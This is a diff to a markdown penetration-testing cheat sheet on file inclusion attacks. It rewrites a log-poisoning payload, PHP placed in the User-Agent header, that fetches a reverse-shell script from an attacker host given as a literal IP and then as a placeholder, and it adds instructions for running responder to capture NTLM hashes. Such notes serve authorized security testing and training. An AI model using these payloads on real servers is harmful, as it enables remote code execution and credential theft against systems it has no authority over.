@@ -35,8 +35,24 @@ If the Apache or Nginx server is vulnerable to LFI inside the include function y
 
 ## Remote file inclusion from log poisonning (RCE)
 ```php
-User-Agent: <?php file_put_contents('/tmp/rev.php', file_get_contents('http://10.11.3.225/rev.php'))?>
+User-Agent: <?php file_put_contents('/tmp/reverse_shell.php', file_get_contents('http://ATTAQUER_IP:ATTACKER_PORT/reverse_shell.php'))?>
 ```
 Then go to /rev.php to start the reverse shell
 In order to work, the php have to be in cleartext when it's read by the webpage  
 e.g. if it appears in b64, nothing will work
+
+# Remote file Inclusion
+
+## Tools
+- responder
+
+### Responder
+
+The `responder` utilisty can catch requests from many fake created servers such as `HTTP`  
+This can sometimes leads to NTLM leaks
+
+***Usage :***  
+To start responder, you must select an interface 
+```bash
+responder -I INTERFACE_NAME
+```
